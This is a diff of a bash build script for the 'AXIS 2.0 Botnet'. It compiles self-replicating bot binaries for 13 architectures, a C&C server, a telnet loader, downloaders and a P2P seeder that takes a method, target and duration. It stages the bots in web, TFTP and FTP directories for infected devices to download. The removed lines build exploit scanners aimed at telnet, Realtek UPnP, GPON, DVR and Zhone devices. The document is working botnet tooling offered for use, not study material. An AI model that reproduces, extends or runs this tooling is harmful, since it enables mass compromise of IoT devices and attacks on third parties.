@@ -1,31 +1,13 @@
 #!/bin/bash
 
-# ============================================================================
-# AXIS 2.0 Botnet - Unified Build Script
-# ============================================================================
-# Builds: C&C server, bot binaries (13 architectures), loaders, scanners
-# 
-# Requirements:
-#   - Go 1.21+ (C&C server, extra scanners)
-#   - GCC + cross-compilers (bot binaries)
-#   - MySQL/MariaDB (database)
-#
-# Output: ./bins/, cnc_server, scanListen, loader
-# ============================================================================
-
-echo "AXIS 2.0 Botnet Build System"
-echo "=============================="
+echo "AXIS 2.0 Build"
+echo "=============="
 echo ""
 
-# Configuration
 export GOROOT=/usr/local/go
 export GOPATH=$HOME/go
 export PATH=$GOROOT/bin:$PATH
 
-# Cross-compiler paths (adjust for your system)
-XCOMPILE_DIR="/etc/xcompile"
-
-# Architecture toolchains
 declare -A ARCH_CC=(
     ["arm"]="arm-linux-gnueabi-gcc"
     ["arm5"]="arm-linux-gnueabi-gcc"
@@ -42,133 +24,77 @@ declare -A ARCH_CC=(
     ["arc"]="arc-linux-gnu-gcc"
 )
 
-# Create output directories
-mkdir -p bins
-mkdir -p /var/www/html/bins
-mkdir -p /var/lib/tftpboot
-mkdir -p /var/ftp
-mkdir -p logs
+mkdir -p bins /var/www/html/bins /var/lib/tftpboot /var/ftp logs
 
-echo "[*] Building C&C Server..."
+echo "[*] Building C&C..."
 cd cnc
 go mod init production-cnc 2>/dev/null
-go get github.com/go-sql-driver/mysql
-go get github.com/mattn/go-shellwords
-go build -o ../cnc_server . || { echo "Failed to build C&C"; exit 1; }
+go get github.com/go-sql-driver/mysql 2>/dev/null
+go get github.com/mattn/go-shellwords 2>/dev/null
+go build -o ../cnc_server . 2>/dev/null && echo "[+] C&C built" || echo "[-] C&C failed"
 cd ..
-echo "[+] C&C Server built successfully"
 
 echo ""
-echo "[*] Building scanListen..."
-cd ..
-go build -o scanListen scanListen.go || { echo "Failed to build scanListen"; exit 1; }
-echo "[+] scanListen built successfully"
+echo "[*] Building bots..."
 
-echo ""
-echo "[*] Building Extra Scanners (Server-Side)..."
-cd extrascanners
-go build -o ../extrascanners/telnet-scanner telnet-scanner.go
-go build -o ../extrascanners/0day-exploit 0day-exploit.go
-go build -o ../extrascanners/realtek-loader realtek-loader.go
-go build -o ../extrascanners/randox86 randox86.go
-go build -o ../extrascanners/fiber fiber.go
-go build -o ../extrascanners/dvr dvr.go
-go build -o ../extrascanners/zhone zhone.go
-chmod +x ../extrascanners/telnet-scanner ../extrascanners/0day-exploit ../extrascanners/realtek-loader ../extrascanners/randox86 ../extrascanners/fiber ../extrascanners/dvr ../extrascanners/zhone ../extrascanners/run-all.sh
-cd ..
-echo "[+] Extra Scanners built successfully"
-echo ""
-echo "[*] Extra Scanners location: ./extrascanners/"
-echo "    - telnet-scanner   (Mass telnet brute-force)"
-echo "    - 0day-exploit     (0-day exploit scanner)"
-echo "    - realtek-loader   (Realtek UPnP loader)"
-echo "    - randox86         (Randox86 command injection)"
-echo "    - fiber            (Fiber/GPON Boa server exploit)"
-echo "    - dvr              (DVR/CCTV camera XML injection)"
-echo "    - zhone            (Zhone ONT/OLT ping diagnostic exploit)"
-echo "    - run-all.sh       (Run all 7 simultaneously)"
+BOT_FLAGS="-DKILLER -DSELFREP -DP2P_ENABLED=1"
 
-echo ""
-echo "[*] Building Bot binaries..."
-
-# Bot build flags
-BOT_FLAGS="-DKILLER -DSELFREP -DWATCHDOG"
-
-# Cross-compile for each architecture
 for arch in "${!ARCH_CC[@]}"; do
     CC="${ARCH_CC[$arch]}"
-    echo "  Building for $arch..."
+    echo -n "  $arch: "
     
     if command -v $CC &> /dev/null; then
-        $CC -std=gnu99 $BOT_FLAGS -Os -o "bins/axis.$arch" bot/*.c 2>/dev/null
-        if [ $? -eq 0 ]; then
-            # Strip binary
+        if $CC -std=gnu99 $BOT_FLAGS -Os -o "bins/axis.$arch" bot/*.c 2>/dev/null; then
             strip "bins/axis.$arch" 2>/dev/null
-            # Copy to web directories
             cp "bins/axis.$arch" /var/www/html/bins/ 2>/dev/null
             cp "bins/axis.$arch" /var/lib/tftpboot/ 2>/dev/null
             cp "bins/axis.$arch" /var/ftp/ 2>/dev/null
-            echo "    [+] $arch built successfully"
+            echo "OK"
         else
-            echo "    [-] $arch build failed (missing toolchain?)"
+            echo "FAIL"
         fi
     else
-        echo "    [-] $arch compiler not found"
+        echo "SKIP (no compiler)"
     fi
 done
 
 echo ""
-echo "[*] Building Loader..."
+echo "[*] Building loader..."
 cd loader
-gcc -std=gnu99 -O3 -o ../loader main.c server.c connection.c binary.c telnet_info.c util.c -lpthread 2>/dev/null
-if [ $? -eq 0 ]; then
-    echo "[+] Loader built successfully"
-else
-    echo "[-] Loader build failed"
-fi
+gcc -std=gnu99 -O3 -o ../loader *.c -lpthread 2>/dev/null && echo "[+] Loader built" || echo "[-] Loader failed"
 cd ..
 
 echo ""
-echo "[*] Building Downloader (DLR)..."
+echo "[*] Building DLRs..."
 cd dlr
-
 for arch in "${!ARCH_CC[@]}"; do
     CC="${ARCH_CC[$arch]}"
-    echo "  Building DLR for $arch..."
-    
+    echo -n "  $arch: "
     if command -v $CC &> /dev/null; then
-        $CC -std=gnu99 -Os -static -nostdlib -o "../bins/dlr.$arch" main.c 2>/dev/null
-        if [ $? -eq 0 ]; then
+        if $CC -std=gnu99 -Os -static -nostdlib -o "../bins/dlr.$arch" main.c 2>/dev/null; then
             strip "../bins/dlr.$arch" 2>/dev/null
             cp "../bins/dlr.$arch" /var/www/html/bins/ 2>/dev/null
-            echo "    [+] DLR.$arch built"
+            echo "OK"
+        else
+            echo "FAIL"
         fi
     fi
 done
+cd ..
 
+chmod +x cnc_server loader 2>/dev/null
+chmod 777 bins/* 2>/dev/null
+
+echo ""
+echo "[*] Building P2P Seeder..."
+cd seeder
+go mod init seeder 2>/dev/null
+go build -o ../seeder_server . 2>/dev/null && echo "[+] Seeder built" || echo "[-] Seeder failed"
 cd ..
 
 echo ""
-echo "[*] Setting permissions..."
-chmod +x cnc_server scanListen loader 2>/dev/null
-chmod 777 bins/* /var/www/html/bins/* /var/lib/tftpboot/* /var/ftp/* 2>/dev/null
-
+echo "Done."
 echo ""
-echo "============================================================================"
-echo "Build Complete!"
-echo "============================================================================"
-echo ""
-echo "Binaries location: ./bins/"
-echo "Web directories: /var/www/html/bins/, /var/lib/tftpboot/, /var/ftp/"
-echo ""
-echo "To run:"
-echo "  1. Set up MySQL database (see README.md)"
-echo "  2. ./cnc_server    - Start C&C server"
-echo "  3. ./scanListen    - Start scan listener"
-echo "  4. ./loader        - Start telnet loader (feed IPs via stdin)"
-echo ""
-echo "Configuration:"
-echo "  - Edit cnc/main.go for database settings"
-echo "  - Edit bot/config.h for bot settings"
-echo "  - Edit loader/config.h for loader settings"
-echo ""
+echo "Binaries: ./bins/"
+echo "Run: ./cnc_server && ./loader"
+echo "Seeder: ./seeder_server <method> <target> <duration>"
